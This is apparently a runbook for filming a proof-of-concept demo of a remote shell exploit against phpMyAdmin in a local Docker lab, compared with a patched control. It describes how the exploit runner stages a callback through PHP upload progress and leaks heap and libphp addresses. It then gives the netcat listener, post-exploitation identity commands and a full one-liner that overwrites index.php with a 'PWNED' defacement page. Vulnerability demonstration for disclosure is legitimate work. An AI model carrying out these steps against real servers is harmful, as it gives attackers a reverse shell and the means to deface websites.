# phpMyAdmin live-shell video runbook — 2026-10-25

This reproduces the same visible flow as `20261024-0446-36.9718234.mp4` on the
new functional phpMyAdmin target: clean site, real callback shell, identity
commands, manual page replacement, browser refresh, and patched comparison.

Everything stays on this PC's loopback Docker lab.

## Before recording

From PowerShell in
`E:\fresh1-pc6-30-08-2026\prior-art-php2shell-joas`:

```powershell
.\demo-reset.ps1
```

Open these pages side by side:

- vulnerable: http://127.0.0.1:18212/
- patched control: http://127.0.0.1:18213/

Both should show the normal phpMyAdmin login page.

## Terminal 1 — listener

```powershell
& 'C:\Program Files (x86)\Nmap\ncat.exe' -lvp 4461
```

Leave it waiting.

## Terminal 2 — real exploit

```powershell
.\demo-shell.ps1
```

The runner maintains 148 blocker connections, stages the callback only through
`session.upload_progress`, leaks the heap/libphp bases, and fires the short
`php /tmp/s*` command. No file is copied into the container by Docker.

## Terminal 1 — commands after callback

Wait for the `www-data@...:/var/www/html$` prompt, then run these one at a time:

```sh
whoami
id
hostname
pwd
cd /var/www/html
cp index.php index.php.bak
ID=$(id)
printf '<html><head><meta charset=utf-8><title>NADSEC PWNED</title><style>body{margin:0;height:100vh;display:grid;place-items:center;background:#050505;color:#fff;font-family:monospace}main{text-align:center}h1{margin:0;font-size:10vw;color:#ff1744;text-shadow:0 0 25px #ff1744}h2{font-size:5vw;color:#7df9ff}pre{color:#9cff57;font-size:1.3rem}</style></head><body><main><h1>NADSEC</h1><h2>PWNED</h2><pre>%s</pre></main></body></html>\n' "$ID" > index.php
ls -l index.php index.php.bak
head -c 160 index.php
```

Refresh the vulnerable browser page. It should show `NADSEC / PWNED` plus the
real `www-data` identity. Refresh the patched page as the denied control; it
should still show the normal login page.

When finished:

```sh
exit
```

## Reset after recording

```powershell
.\demo-reset.ps1
```

That recreates both ephemeral app containers and verifies the normal login page
is back. The validated callback used one fire attempt and returned:

```text
whoami  -> www-data
id      -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd     -> /var/www/html
```
